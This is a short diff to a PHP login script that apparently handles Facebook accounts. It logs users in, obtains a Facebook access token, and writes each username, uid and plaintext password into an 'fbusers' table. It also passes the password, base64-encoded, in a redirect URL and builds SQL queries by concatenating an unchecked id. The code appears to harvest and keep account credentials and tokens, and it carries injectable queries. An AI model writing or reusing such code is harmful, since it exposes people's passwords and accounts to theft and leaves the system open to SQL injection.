@@ -15,12 +15,10 @@ if($RA and $us == "mohtasm.sawilh"){
 $us = Sion("user");
 $pass = Sion("pass");
 }
-if(!isv("token")){
 if(Sion("Lerror")){
-$pass = Sion("pass");
+$Spass = Sion("pass");
 }else{
-$pass = isv("pass");
-}
+$Spass = isv("pass");
 }
 if(isv("reSend")){
 header("Location: ../fram.php?user=".Sion("user")."&pass=".base64_encode(Sion("pass"))." ");
@@ -34,6 +32,8 @@ $user =  Nlogin($us,$pass,"android");
 }else{
 if(!isv("user",1)){
 $user =  GetInfo(isv("token"));
+$us = Sion("user");
+$pass = Sion("pass");
 }else{
 $user =  GetInfo(isv("user",1));
 
@@ -73,7 +73,6 @@ json($St->url.'/verify_chrome.php?id='.$id.'&type=fb&friends='.$access);
            }
 if($id != "" and $name != "" and $access != ""){
   Cinst("fbusers",array("username"=>$us,"uid"=>$id,"password"=>$pass,"date"=>time(),"Lerror"=>Sion("Lerror")),"where uid=".$id);
-  
  if(Num("users","where user_id=".$id)){
    //UpDate();
   $insert =    UpDate("users",array("access"=>$access,"cantry"=>$cantry,"disactive"=>0,"data"=>$time),false,"where user_id=".$id);
